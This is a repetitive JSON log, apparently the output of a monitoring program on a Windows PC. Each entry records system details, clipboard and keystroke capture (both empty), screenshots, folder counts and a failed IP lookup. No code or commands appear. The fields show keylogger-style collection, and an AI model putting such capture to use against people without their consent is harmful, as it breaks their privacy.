{"timestamp": "2025-06-14T07:59:35.583181+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c67c556a21d7dd423ec876237bfd86da6db2952ea144f60cb39585a22b87656d", "_raw_log_hash": "f86bf33acfc4f3c6d80b9d2a4ce59001ba78430bc4ea78c64a17700a2691b654"}
{"timestamp": "2025-06-14T07:59:49.133688+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b6e441481a68827a3cd204e613b042b94f1305086b425d41317a2f04dd4677b1", "_raw_log_hash": "61442054daa123908026b6b5b099ad656eb0bf2de18110f669400b9089781921"}
{"timestamp": "2025-06-14T08:00:02.736436+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "564b3ab42e0af3aaf63a2b74641bb875f9bb63120739ca2272f6af8e0013bf4e", "_raw_log_hash": "2a614465a887fb234b5334003b7e37a9c18e6c3deed2a1cf74c78cede91efe87"}
{"timestamp": "2025-06-14T08:00:16.321364+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b9e95ab96bb67c9c36099851f827f87fb71d6489ddf8acd747a144f356b84f2b", "_raw_log_hash": "d0cacfd2615880ecae82ac54b336505ee2891f921fb9bd19fc71fb4515b1f084"}
{"timestamp": "2025-06-14T08:00:29.849773+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "6991dd9894bf998953feb3c5f783bcb978d3db1734e03a1f581ae14d28be7e81", "_raw_log_hash": "4dc5d73e40ff523ae85c9a6dc027e54ac08f13da2e9777f5d13dfbb04be90ace"}
{"timestamp": "2025-06-14T08:00:43.415047+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "17a19d0a093359f71203af4ff7684641c3cb1de4fdeca766825ac3646d79c8e6", "_raw_log_hash": "87274d0e179d0e530ce340d69a999bd693530dafdbcdd3ec25379d95e254a410"}
{"timestamp": "2025-06-14T08:00:56.876327+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a3e18c65c86158a9ae3b4cc0bf4ce68d1d0ebaae5d4529139383cefa9027db46", "_raw_log_hash": "77a50203546ea107e298d6cf93d35b416c574ff837670a962efb44053d28e21e"}
{"timestamp": "2025-06-14T08:01:10.416062+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "49e075b3734dd1d8d9c7e6c1743b8d30532c7a82f8acc7c74a7997ace3c792ac", "_raw_log_hash": "1ca20554bc2853f9b52e02ffe3a2c95342b8212fed530af2372f18c0bf356206"}
{"timestamp": "2025-06-14T08:01:23.930186+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "92abcdd12d99cf95dbf8f0aa3681670ef3b8eb07ee95b7a208d0c9c0022187be", "_raw_log_hash": "9b43e7fb5c300bc9bd0de2365ba20b5fb32012e3b13669d6eba4509d3ccf59aa"}
{"timestamp": "2025-06-14T08:01:37.532956+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b3f452c2e643b82b06cbb6b2c654bc22ed1ad9051f2a13a0c828a1c61ec1016c", "_raw_log_hash": "501784e03a816f4f841ebfe3ac26d88a38f093c87c837cab85612c3d62c844ec"}
{"timestamp": "2025-06-14T08:01:51.052438+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "0fbc6800b44feb614af6e54eee6d04a82ae2c5713c732db16f19c66704d5100f", "_raw_log_hash": "71c5f3f3ce6a4340416dba3421a9b6902b5559729836c9dab192a4d40b246975"}
{"timestamp": "2025-06-14T08:02:04.549677+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "05ec04ad3d65fd601c6a9ba69e255210744e928f15476125ee809ae1e185ca48", "_raw_log_hash": "75a7c05edd42759a29dbf4b73329862a6b276bb4a45a895df6c78d20bb57cf30"}
{"timestamp": "2025-06-14T08:02:18.084619+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "05ee995cd352e982bcfaa4d6b28d121ada133ad1e872a4f5808f44de95ab8f26", "_raw_log_hash": "753b1eebbb6be9dd45263fb7db8eaf73536a747bd61e9328eabb48023fd68e11"}
{"timestamp": "2025-06-14T08:02:31.655685+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "809540d880e3f4584ad8c558295110091f8298513f9cc02e6ae4f422e5d957f2", "_raw_log_hash": "9c51871e8efd71e29dbfdb52a349134edbdfa9ba7144c9a4d0c7c6452e5d098b"}
{"timestamp": "2025-06-14T08:02:45.277950+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "53925456b6f405607ef88d937646980a92e19595fd8d94a4b57512ce91af611e", "_raw_log_hash": "6536029fdcaca1e400c06440517939bc3d2c6c8119e20f86760810fb67abe3e5"}
{"timestamp": "2025-06-14T08:02:58.866835+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8eb78ac0d972baa1710d93a9fd0eb0a8582ea787fc4d21e6f5dd19fb0a3bfb1a", "_raw_log_hash": "02c55055999e0854913a2f9291c9a519d3badf06463797e23edf93ef2bb131dd"}
{"timestamp": "2025-06-14T08:03:12.365155+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4018b3a93edc3b5e9bda4fd89cd609745bc87a89b911fcaaf2f0234f23238619", "_raw_log_hash": "0b79577799598b1463f69938288eef4012565d6b92a3cd412e7193dfdf0a425a"}
{"timestamp": "2025-06-14T08:03:25.965136+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f2e7acf6c49a7ba315274433e7a02a7e57a8e99788e4a648a3ed92af29db2e6e", "_raw_log_hash": "1e6cd1b36568e6fd261e5fecbfc2397ffc88202ee212c3d3aa60b905d873ae18"}
{"timestamp": "2025-06-14T08:03:39.507908+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "886bacf0f806e1ca49e49e898f746498d85b5ff800124d3042ae8d7fad25c66a", "_raw_log_hash": "b25fdeaab845476ee6f6d0037db89abd06457a002570cf991bcac17bb2c1cab8"}
{"timestamp": "2025-06-14T08:03:53.009568+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9dcd252bc924d8969acaa6f9eecc99fcd15da94b9bf1aa44d6040e4f483be00e", "_raw_log_hash": "fed43783a331c5d5a395d580d7b4b5ad46def89e2825d9aad652fa70edc3a547"}
{"timestamp": "2025-06-14T08:04:06.657435+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "811298e1a4c6fc045f0b7b415d851a35622f8e298a1032181f6d055b054daea8", "_raw_log_hash": "120839737b9d0033c0e899d88cbd2d570651923ebc90dade21c6260fb4ab6d07"}
{"timestamp": "2025-06-14T08:04:20.207294+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "43b3ec7a8e3f2f53eb56a6fce24ea8e1ec0cff2d5ef961d1e4abcdde68854a4b", "_raw_log_hash": "345d377564774f378b2eb5fd442604439edb4fb927194ba2cb72e3b706172b8f"}
{"timestamp": "2025-06-14T08:04:33.816705+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "de7ba0fec4ccc8fc7cb929b9b808a61f7509d860079de9277eed7dfbd09ca39e", "_raw_log_hash": "850fa825067ba3d3ff9935badec1ea1faeb99a33f50a677848d2c6c69ca166df"}
{"timestamp": "2025-06-14T08:04:47.397615+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "15163ddca4982382fdc4d81000d34d2a4cbfbfb109175afd9055594c5e1f3f62", "_raw_log_hash": "443ad8e6482cf5e5d515f00c6a4ee238ae7c2c1e3c716bca43c8e2939ffa4ec5"}
{"timestamp": "2025-06-14T08:05:00.882542+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f0648ceb03b3819638cfa63b6b32ae21ede5957509293b3db817c3597e0f27b1", "_raw_log_hash": "1e374526c20875a428b71da5bea8013aef81c46262e969365c5b9b917915b014"}
{"timestamp": "2025-06-14T08:05:14.452825+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "59771a1578edfefdd039528e001572c85e2543274c32e8dd5ecc8570fc81dc47", "_raw_log_hash": "53ab37dfe6770d10f595641276ff9893aac13e81ae889cdb15bf517e9bd0730c"}
